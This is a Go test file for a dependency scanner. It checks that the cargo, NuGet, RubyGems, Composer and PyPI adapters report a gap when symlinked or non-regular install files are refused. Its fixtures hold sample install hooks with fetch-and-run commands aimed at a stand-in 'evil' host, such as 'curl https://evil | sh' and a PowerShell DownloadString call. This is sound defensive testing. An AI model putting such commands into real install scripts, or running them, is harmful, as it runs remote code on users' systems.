package instsurf_test

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem"
	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/composer"
	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/pypi"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/purl"
)

// R-01 defense in depth. The end-to-end CLI fixtures are npm-focused, so this
// covers the SAME refusal contract for every other adapter at the adapter
// boundary: a hostile checkout that makes install-surface material unreadable
// must produce a typed gap, and an ordinary absence must not.
//
// Each case plants a symlink pointing out of the project where the adapter
// expects its install-time file, which is the cheapest real attack: containment
// blocks the read, and without gap accounting the evidence would simply vanish.

// hostileLink creates dir/<name> as a symlink to a file outside the project.
func hostileLink(t *testing.T, dir, name, content string) {
	t.Helper()
	outside := filepath.Join(t.TempDir(), "payload")
	if err := os.WriteFile(outside, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(dir, name)); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
}

func rootGraph(id, eco, name string) *graph.Graph {
	g := graph.New()
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: eco, Name: name, Version: "1.0.0"})
	g.MarkRoot(id)
	return g
}

func wantContainmentGap(t *testing.T, label string, err error) {
	t.Helper()
	gaps := instsurf.GapsOf(err)
	if len(gaps) == 0 {
		t.Fatalf("%s: a refused install-surface read produced no gap (err=%v) — "+
			"the evidence disappeared and the scan would look clean", label, err)
	}
	for _, g := range gaps {
		if g.Reason == instsurf.GapContainment {
			return
		}
	}
	t.Errorf("%s: expected a containment-refusal gap, got %v", label, gaps)
}

func wantNoGap(t *testing.T, label string, err error) {
	t.Helper()
	if gaps := instsurf.GapsOf(err); len(gaps) != 0 {
		t.Errorf("%s: an ordinary absence must not be a gap, got %v", label, gaps)
	}
}

func TestCargoRefusalIsAGap(t *testing.T) {
	dir := t.TempDir()
	hostileLink(t, dir, "build.rs", `fn main(){ std::process::Command::new("sh"); }`)
	g := rootGraph(purl.NewCargo("crate", "1.0.0").String(), "cargo", "crate")

	var a ecosystem.InstallSurfaceExtractor = cargo.New()
	wantContainmentGap(t, "cargo build.rs", a.ExtractInstallSurface(dir, g))

	// Control: no build.rs at all is the common, clean case.
	clean := t.TempDir()
	wantNoGap(t, "cargo absent build.rs", a.ExtractInstallSurface(clean, rootGraph(
		purl.NewCargo("crate", "1.0.0").String(), "cargo", "crate")))
}

func TestNuGetRefusalIsAGap(t *testing.T) {
	dir := t.TempDir()
	hostileLink(t, dir, "install.ps1", `iex (New-Object Net.WebClient).DownloadString('https://evil')`)
	g := rootGraph(purl.NewNuGet("pkg", "1.0.0").String(), "nuget", "pkg")

	var a ecosystem.InstallSurfaceExtractor = nuget.New()
	wantContainmentGap(t, "nuget install.ps1", a.ExtractInstallSurface(dir, g))

	clean := t.TempDir()
	wantNoGap(t, "nuget absent install.ps1", a.ExtractInstallSurface(clean, rootGraph(
		purl.NewNuGet("pkg", "1.0.0").String(), "nuget", "pkg")))
}

func TestRubyGemsRefusalIsAGap(t *testing.T) {
	dir := t.TempDir()
	hostileLink(t, dir, "extconf.rb", `system("curl https://evil | sh")`)
	g := rootGraph(purl.NewGem("gem", "1.0.0").String(), "gem", "gem")

	var a ecosystem.InstallSurfaceExtractor = rubygems.New()
	wantContainmentGap(t, "rubygems extconf.rb", a.ExtractInstallSurface(dir, g))

	clean := t.TempDir()
	wantNoGap(t, "rubygems absent extconf.rb", a.ExtractInstallSurface(clean, rootGraph(
		purl.NewGem("gem", "1.0.0").String(), "gem", "gem")))
}

// R-03 P2: ext/ enumeration is containment-checked before listing, so a
// symlinked-out ext/ directory is refused rather than enumerated.
func TestRubyGemsExtDirSymlinkIsAGap(t *testing.T) {
	dir := t.TempDir()
	outsideExt := t.TempDir()
	if err := os.MkdirAll(filepath.Join(outsideExt, "native"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(outsideExt, "native", "extconf.rb"), []byte("system('x')"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outsideExt, filepath.Join(dir, "ext")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	g := rootGraph(purl.NewGem("gem", "1.0.0").String(), "gem", "gem")

	var a ecosystem.InstallSurfaceExtractor = rubygems.New()
	wantContainmentGap(t, "rubygems ext/ symlink", a.ExtractInstallSurface(dir, g))
}

func TestComposerRefusalIsAGap(t *testing.T) {
	dir := t.TempDir()
	hostileLink(t, dir, "composer.json", `{"scripts":{"post-install-cmd":"curl https://evil | sh"}}`)
	id := purl.NewComposer("vendor/pkg", "1.0.0").String()
	g := rootGraph(id, "composer", "vendor/pkg")

	var a ecosystem.InstallSurfaceExtractor = composer.New()
	wantContainmentGap(t, "composer root manifest", a.ExtractInstallSurface(dir, g))

	clean := t.TempDir()
	wantNoGap(t, "composer absent manifest", a.ExtractInstallSurface(clean, rootGraph(
		id, "composer", "vendor/pkg")))
}

// The refusal matrix beyond symlinks (R-03 P2): the SAME adapters must also turn
// a non-regular install-time file (a directory planted where a file belongs)
// into a typed gap, not a silent skip. Symlink escape and non-regular are
// different securefs refusal reasons, and an adapter could conceivably handle
// one and swallow the other.
func TestAdapterNonRegularInstallFileIsAGap(t *testing.T) {
	cases := []struct {
		name    string
		file    string // install-time file the adapter reads at the project root
		newA    func() ecosystem.InstallSurfaceExtractor
		id      string
		eco     string
		pkgName string
	}{
		{"cargo", "build.rs", func() ecosystem.InstallSurfaceExtractor { return cargo.New() },
			purl.NewCargo("crate", "1.0.0").String(), "cargo", "crate"},
		{"nuget", "install.ps1", func() ecosystem.InstallSurfaceExtractor { return nuget.New() },
			purl.NewNuGet("pkg", "1.0.0").String(), "nuget", "pkg"},
		{"rubygems", "extconf.rb", func() ecosystem.InstallSurfaceExtractor { return rubygems.New() },
			purl.NewGem("gem", "1.0.0").String(), "gem", "gem"},
		{"composer", "composer.json", func() ecosystem.InstallSurfaceExtractor { return composer.New() },
			purl.NewComposer("vendor/pkg", "1.0.0").String(), "composer", "vendor/pkg"},
		{"pypi-local", "setup.py", func() ecosystem.InstallSurfaceExtractor { return pypi.New() },
			purl.NewPyPI("proj", "1.0.0").String(), "pypi", "proj"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			// Plant a DIRECTORY where the adapter expects a regular file.
			if err := os.MkdirAll(filepath.Join(dir, c.file), 0o755); err != nil {
				t.Fatal(err)
			}
			g := rootGraph(c.id, c.eco, c.pkgName)
			err := c.newA().ExtractInstallSurface(dir, g)
			gaps := instsurf.GapsOf(err)
			if len(gaps) == 0 {
				t.Fatalf("%s: a non-regular install file produced no gap (err=%v)", c.name, err)
			}
			var found bool
			for _, gp := range gaps {
				if gp.Reason == instsurf.GapNotRegular {
					found = true
				}
			}
			if !found {
				t.Errorf("%s: expected a not-a-regular-file gap, got %v", c.name, gaps)
			}
		})
	}
}

// Composer and NuGet parse JSON manifests, so a syntactically broken one is
// "read but not understood" — a parse gap, distinct from a refusal or absence.
func TestJSONAdapterParseFailureIsAGap(t *testing.T) {
	cases := []struct {
		name    string
		file    string
		content string
		newA    func() ecosystem.InstallSurfaceExtractor
		id      string
		eco     string
		pkgName string
	}{
		{"composer", "composer.json", "{not json", func() ecosystem.InstallSurfaceExtractor { return composer.New() },
			purl.NewComposer("vendor/pkg", "1.0.0").String(), "composer", "vendor/pkg"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, c.file), []byte(c.content), 0o644); err != nil {
				t.Fatal(err)
			}
			g := rootGraph(c.id, c.eco, c.pkgName)
			gaps := instsurf.GapsOf(c.newA().ExtractInstallSurface(dir, g))
			var found bool
			for _, gp := range gaps {
				if gp.Reason == instsurf.GapParse {
					found = true
				}
			}
			if !found {
				t.Errorf("%s: a malformed manifest must be a parse gap, got %v", c.name, gaps)
			}
		})
	}
}

func TestPyPILocalRefusalIsAGap(t *testing.T) {
	dir := t.TempDir()
	hostileLink(t, dir, "setup.py", `import os; os.system("curl https://evil | sh")`)
	id := purl.NewPyPI("proj", "1.0.0").String()
	g := rootGraph(id, "pypi", "proj")

	// Constructed without an sdist fetcher: only the LOCAL read path is exercised.
	var a ecosystem.InstallSurfaceExtractor = pypi.New()
	wantContainmentGap(t, "pypi local setup.py", a.ExtractInstallSurface(dir, g))

	clean := t.TempDir()
	wantNoGap(t, "pypi absent setup.py", a.ExtractInstallSurface(clean, rootGraph(
		id, "pypi", "proj")))
}
